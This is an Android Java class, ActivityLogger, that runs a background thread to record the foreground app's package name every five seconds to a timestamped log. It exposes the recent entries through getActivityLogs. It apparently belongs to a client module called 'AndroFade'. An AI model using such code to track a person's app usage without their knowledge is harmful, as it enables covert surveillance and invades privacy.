package my.app.client;

import android.content.Context;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ActivityLogger {
    private Context context;
    private File logFile;
    private static final String LOG_DIR = "AndroFade/logs";
    private Thread logThread;
    private boolean isLogging = false;

    public ActivityLogger(Context context) {
        this.context = context;
        initializeLogFile();
    }

    private void initializeLogFile() {
        try {
            File logDir = new File(context.getExternalFilesDir(null), LOG_DIR);
            if (!logDir.exists()) logDir.mkdirs();
            String filename = "activity_" + System.currentTimeMillis() + ".log";
            logFile = new File(logDir, filename);
            logFile.createNewFile();
        } catch (Exception e) {
            android.util.Log.e("ActivityLogger", "Error initializing log file: " + e.getMessage());
        }
    }

    public void startLogging() {
        if (isLogging) return;
        isLogging = true;
        logThread = new Thread(this::monitorActivity);
        logThread.setDaemon(true);
        logThread.start();
    }

    private void monitorActivity() {
        try {
            while (isLogging) {
                String activity = getCurrentActivity();
                if (activity != null && !activity.isEmpty()) logActivity("App: " + activity);
                Thread.sleep(5000);
            }
        } catch (Exception e) {
            android.util.Log.e("ActivityLogger", "Monitoring error: " + e.getMessage());
        }
    }

    private String getCurrentActivity() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            java.util.List<android.app.ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
            if (tasks != null && !tasks.isEmpty()) return tasks.get(0).topActivity.getPackageName();
        } catch (Exception e) {
            android.util.Log.e("ActivityLogger", "Get activity error: " + e.getMessage());
        }
        return null;
    }

    private void logActivity(String message) {
        try {
            if (logFile == null || !logFile.exists()) initializeLogFile();
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            writer.write("[" + timestamp + "] " + message + "\n");
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("ActivityLogger", "Log write error: " + e.getMessage());
        }
    }

    public String getActivityLogs() {
        try {
            if (logFile == null || !logFile.exists()) return "No logs available";
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(logFile));
            StringBuilder logs = new StringBuilder();
            String line;
            int lineCount = 0;
            while ((line = reader.readLine()) != null && lineCount < 100) {
                logs.append(line).append("\n");
                lineCount++;
            }
            reader.close();
            return logs.toString();
        } catch (Exception e) {
            return "Error reading logs: " + e.getMessage();
        }
    }

    public void stopLogging() {
        isLogging = false;
    }
}
